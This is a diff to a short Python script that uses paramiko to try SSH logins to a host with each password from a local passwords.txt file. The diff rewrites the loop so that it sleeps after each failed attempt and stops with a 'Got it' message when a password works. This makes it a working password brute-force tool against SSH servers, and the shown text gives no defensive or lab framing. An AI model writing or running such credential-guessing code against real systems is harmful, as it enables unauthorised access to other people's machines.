@@ -14,27 +14,20 @@ def sshlogin(password):
     ssh.connect(host, port, username, password)
     #stdin, stdout, stderr = ssh.exec_command('ls')
     #print (stdout.readlines())
-   
+
+
 file = open("passwords.txt", "r") 
 passwords = file.read().split("\n")
 nopes = []
-while True:
-    for item in passwords:
-        if item not in nopes:
-            try:
-                login = sshlogin(item)    
-            except paramiko.AuthenticationException:
-                print(item+ ' = nope')
-                nopes.append(item)
-                time.sleep(10)
-            except Exception as e:
-                pass
-            except EOFError as e:
-                pass
-            except paramiko.ssh_exception.SSHException as e:
-                pass
-            except ConnectionError as e:
-                pass
-            else:
-                break
-                print('Got it: '+item)
+client = paramiko.SSHClient()
+for item in passwords:
+    try:
+        login = sshlogin(item)
+    except paramiko.AuthenticationException:
+        print(item+ ' = nope')
+        #nopes.append(item)
+        client.close()
+        time.sleep(15)
+    else:
+        print('Got it: '+item)
+        break
